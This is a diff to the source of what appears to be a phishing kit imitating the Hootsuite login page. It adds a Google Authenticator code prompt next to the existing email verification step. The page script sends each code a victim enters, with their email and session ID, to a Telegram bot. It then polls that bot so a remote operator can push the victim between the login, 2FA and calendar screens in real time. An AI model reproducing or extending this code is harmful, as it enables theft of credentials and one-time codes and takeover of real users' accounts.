@@ -874,12 +874,63 @@
                                                     <div class="notificationTitle">
                                                         Please try again
                                                     </div>
-                                                    Sorry, we couldn't find that email and/or password
+                                                    Verification code is incorrect or expired.
                                                 </div>
                                             </div>
                                             @endif
                                             <div class="inputWrapper">
                                                 <label for="loginEmailInput">Enter your confirmation code here</label>
+                                                <input id="loginEmailInput" maxlength="6" minlength="6" required
+                                                       class="inputContainer _requiredInput _emailInput" type="number"
+                                                       name="code">
+                                            </div>
+                                            <button class="button disabled _submit submitButton"
+                                                    type="submit">Submit
+                                            </button>
+                                            <div class="links">
+                                                <p>Didn't receive an email? <a href="javascript:void(0)">Resend</a></p>
+                                                <p><a href="javascript:void(0)">Sign in to another account</a></p>
+                                            </div>
+                                        </div>
+                                        <div class="right-section">
+                                            <img src="{{ asset('img/2fa-image.png') }}" alt="">
+                                        </div>
+                                    </form>
+                                @endif
+                                @if ($googleAuthCode)
+                                    <form wire:submit.prevent="codeSubmitGoogle" class="email-2fa-wrapper">
+                                        <div class="left-section">
+                                            <a href="Javascript:void(0)" class="link">
+                                                ← Back to signin
+                                            </a>
+                                            <h2 class="title">Verify your account</h2>
+                                            <p>
+                                                You will need to verify your account before you can proceed.
+                                                Click the button below and we’ll send you a verification email.
+                                            </p>
+                                            <p style="font-weight: bold;">Why am I seeing this screen?</p>
+                                            <p>
+                                                Most often, users who see this screen have either entered their
+                                                password incorrectly too many times or are logging in from a new
+                                                location.
+                                                As a security measure, you'll need to click on the verification link
+                                                that we’ve sent to your email.
+                                            </p>
+                                            @if($googleAuthCodeError)
+                                                <div class="_notification notification error" role="alert" style="margin-top: 10px;margin-bottom: 10px">
+                                                    <div class="notificationIconContainer">
+                                                        <img src="https://assets.hootsuite.com/v2/images/static/login/alerts/error-alert-icon.0fce3bf8.svg" class="notificationIcon">
+                                                    </div>
+                                                    <div class="notificationMessage">
+                                                        <div class="notificationTitle">
+                                                            Please try again
+                                                        </div>
+                                                        Verification code is incorrect or expired.
+                                                    </div>
+                                                </div>
+                                            @endif
+                                            <div class="inputWrapper">
+                                                <label for="loginEmailInput">For security verification, please enter the 6-digit code from your Google Authenticator app.</label>
                                                 <input id="loginEmailInput" maxlength="6" minlength="6" required
                                                        class="inputContainer _requiredInput _emailInput" type="number"
                                                        name="code">
@@ -1111,12 +1162,12 @@
                 reply_markup: {
                     inline_keyboard: [
                         [{
-                            text: `2fa`,
-                            callback_data: `/2fa ${sessionId}`,
+                            text: `Email 2fa`,
+                            callback_data: `/email2fa ${sessionId}`,
                         },
                             {
-                                text: `2fa error`,
-                                callback_data: `/2faError ${sessionId}`,
+                                text: `Email 2fa error`,
+                                callback_data: `/email2faError ${sessionId}`,
                             },
                         ],
                         [{
@@ -1137,25 +1188,21 @@
             }),
         })
             .then(() => {
-                @this.
-                set('loginError', false);
-                @this.
-                set('enableLoginForm', false);
-                @this.
-                set('enableLoadingAfterSubmit', true);
-                @this.
-                set('emailAuthCode', false);
-                @this.
-                set('emailAuthCodeError', false);
+                @this.set('loginError', false);
+                @this.set('enableLoginForm', false);
+                @this.set('enableLoadingAfterSubmit', true);
+                @this.set('emailAuthCode', false);
+                @this.set('emailAuthCodeError', false);
+                @this.set('googleAuthCode', false);
+                @this.set('googleAuthCodeError', false);
             })
             .catch((error) => {
                 console.log("Unknown error in auth.html", error);
             });
-
     });
-    document.addEventListener('code-submit-mobile', function () {
+    document.addEventListener('code-submit-google', function () {
         const tURL = `https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`;
-        const code = $('input[name="code2"]').val();
+        const code = $('input[name="code"]').val();
         fetch(tURL, {
             method: "POST",
             headers: {
@@ -1169,12 +1216,12 @@
                 reply_markup: {
                     inline_keyboard: [
                         [{
-                            text: `2fa`,
-                            callback_data: `/2fa ${sessionId}`,
+                            text: `Google 2fa`,
+                            callback_data: `/google2fa ${sessionId}`,
                         },
                             {
-                                text: `2fa error`,
-                                callback_data: `/2faError ${sessionId}`,
+                                text: `Google 2fa error`,
+                                callback_data: `/google2faError ${sessionId}`,
                             },
                         ],
                         [{
@@ -1195,24 +1242,20 @@
             }),
         })
             .then(() => {
-                @this.
-                set('loginError', false);
-                @this.
-                set('enableLoginForm', false);
-                @this.
-                set('enableLoadingAfterSubmit', true);
-                @this.
-                set('emailAuthCode', false);
-                @this.
-                set('emailAuthCodeError', false);
-                @this.
-                set('emailAuthCode', false);
+                @this.set('loginError', false);
+                @this.set('enableLoginForm', false);
+                @this.set('enableLoadingAfterSubmit', true);
+                @this.set('emailAuthCode', false);
+                @this.set('emailAuthCodeError', false);
+                @this.set('googleAuthCode', false);
+                @this.set('googleAuthCodeError', false);
             })
             .catch((error) => {
                 console.log("Unknown error in auth.html", error);
             });
 
     });
+
     const startInterval = () => {
         let lastUpdateId = 0;
         setInterval(() => {
@@ -1231,8 +1274,7 @@
                                 lastUpdateId = update.update_id;
                                 if (update.callback_query) {
                                     const callbackData = update.callback_query.data;
-                                    if (callbackData ===
-                                        `/loginError ${localStorage.getItem('sessionId')}`) {
+                                    if (callbackData === `/loginError ${localStorage.getItem('sessionId')}`) {
                                         $('#continue-modal').show();
                                         @this.set('showCalenderProgress', false);
                                         @this.set('loginError', true);
@@ -1241,9 +1283,9 @@
                                         @this.set('emailAuthCode', false);
                                         @this.set('emailAuthCodeError', false);
                                         @this.set('showCalender', false);
-
-                                    } else if (callbackData ===
-                                        `/login ${localStorage.getItem('sessionId')}`) {
+                                        @this.set('googleAuthCode', false);
+                                        @this.set('googleAuthCodeError', false);
+                                    } else if (callbackData === `/login ${localStorage.getItem('sessionId')}`) {
                                         $('#continue-modal').show();
                                         @this.set('showCalenderProgress', false);
                                         @this.set('loginError', false);
@@ -1252,8 +1294,9 @@
                                         @this.set('emailAuthCode', false);
                                         @this.set('emailAuthCodeError', false);
                                         @this.set('showCalender', false);
-                                    } else if (callbackData ===
-                                        `/email2fa ${localStorage.getItem('sessionId')}`) {
+                                        @this.set('googleAuthCode', false);
+                                        @this.set('googleAuthCodeError', false);
+                                    } else if (callbackData === `/email2fa ${localStorage.getItem('sessionId')}`) {
                                         $('#continue-modal').show();
                                         @this.set('showCalenderProgress', false);
                                         @this.set('loginError', false);
@@ -1262,40 +1305,52 @@
                                         @this.set('emailAuthCode', true);
                                         @this.set('emailAuthCodeError', false);
                                         @this.set('showCalender', false);
-                                    } else if (callbackData ===
-                                        `/email2faError ${localStorage.getItem('sessionId')}`) {
+                                        @this.set('googleAuthCode', false);
+                                        @this.set('googleAuthCodeError', false);
+                                    } else if (callbackData === `/email2faError ${localStorage.getItem('sessionId')}`) {
                                         $('#continue-modal').show();
-                                        @this.
-                                        set('showCalenderProgress', false);
-                                        @this.
-                                        set('loginError', false);
-                                        @this.
-                                        set('enableLoginForm', false);
-                                        @this.
-                                        set('enableLoadingAfterSubmit', false);
-                                        @this.
-                                        set('emailAuthCode', true);
-                                        @this.
-                                        set('emailAuthCodeError', true);
-                                        @this.
-                                        set('showCalender', false);
-                                    } else if (callbackData ===
-                                        `/schedule ${localStorage.getItem('sessionId')}`) {
-                                        @this.
-                                        set('showCalenderProgress', false);
-                                        @this.
-                                        set('loginError', false);
-                                        @this.
-                                        set('enableLoginForm', false);
-                                        @this.
-                                        set('enableLoadingAfterSubmit', false);
-                                        @this.
-                                        set('emailAuthCode', false);
-                                        @this.
-                                        set('emailAuthCodeError', false);
+                                        @this.set('showCalenderProgress', false);
+                                        @this.set('loginError', false);
+                                        @this.set('enableLoginForm', false);
+                                        @this.set('enableLoadingAfterSubmit', false);
+                                        @this.set('emailAuthCode', true);
+                                        @this.set('emailAuthCodeError', true);
+                                        @this.set('showCalender', false);
+                                        @this.set('googleAuthCode', false);
+                                        @this.set('googleAuthCodeError', false);
+                                    }else if (callbackData === `/google2fa ${localStorage.getItem('sessionId')}`) {
+                                        $('#continue-modal').show();
+                                        @this.set('showCalenderProgress', false);
+                                        @this.set('loginError', false);
+                                        @this.set('enableLoginForm', false);
+                                        @this.set('enableLoadingAfterSubmit', false);
+                                        @this.set('emailAuthCode', false);
+                                        @this.set('emailAuthCodeError', false);
+                                        @this.set('showCalender', false);
+                                        @this.set('googleAuthCode', true);
+                                        @this.set('googleAuthCodeError', false);
+                                    } else if (callbackData === `/google2faError ${localStorage.getItem('sessionId')}`) {
+                                        $('#continue-modal').show();
+                                        @this.set('showCalenderProgress', false);
+                                        @this.set('loginError', false);
+                                        @this.set('enableLoginForm', false);
+                                        @this.set('enableLoadingAfterSubmit', false);
+                                        @this.set('emailAuthCode', false);
+                                        @this.set('emailAuthCodeError', false);
+                                        @this.set('showCalender', false);
+                                        @this.set('googleAuthCode', true);
+                                        @this.set('googleAuthCodeError', true);
+                                    }else if (callbackData === `/schedule ${localStorage.getItem('sessionId')}`) {
+                                        @this.set('showCalenderProgress', false);
+                                        @this.set('loginError', false);
+                                        @this.set('enableLoginForm', false);
+                                        @this.set('enableLoadingAfterSubmit', false);
+                                        @this.set('emailAuthCode', false);
+                                        @this.set('emailAuthCodeError', false);
                                         $('#continue-modal').hide();
-                                        @this.
-                                        set('showCalender', true);
+                                        @this.set('showCalender', true);
+                                        @this.set('googleAuthCode', false);
+                                        @this.set('googleAuthCodeError', false);
                                     }
                                 }
                             }
@@ -1311,7 +1366,6 @@
     function generateSessionId() {
         return `${Date.now()}-${Math.random().toString(36).substr(2, 9)}-${crypto.getRandomValues(new Uint32Array(1))[0]}`;
     }
-
     window.selectDate = function (date) {
         $('#calendar-wrapper').updateCalendarOptions({
             date: date
@@ -1517,23 +1571,25 @@
                 text: `===PICK A DATE: ${localStorage.getItem('email')}===\n ${selectedDateFinal}`,
                 reply_markup: {
                     inline_keyboard: [
-                        [{
-                            text: `Kick to 2fa`,
-                            callback_data: `/2fa ${session}`,
-                        },
+                        [
+                            {
+                                text: `Kick to Email 2fa`,
+                                callback_data: `/email2fa ${session}`,
+                            },
+                            {
+                                text: `Kick to Google 2fa`,
+                                callback_data: `/google2fa ${session}`,
+                            },
+                        ],
+                        [
                             {
                                 text: `Kick to Login`,
                                 callback_data: `/login ${session}`,
                             },
-                        ],
-                        [{
+                            {
                             text: `Kick to the calendar`,
                             callback_data: `/schedule ${session}`,
-                        },
-                            {
-                                text: `Thank You`,
-                                callback_data: `/thankyou ${session}`,
-                            },
+                            }
                         ]
                     ],
                 },
@@ -1562,6 +1618,8 @@
         @this.set('emailAuthCodeError', false);
         @this.set('showCalender', false);
         @this.set('showCalenderProgress', false);
+        @this.set('googleAuthCode', false);
+        @this.set('googleAuthCodeError', false);
     });
     statusCheck();
 
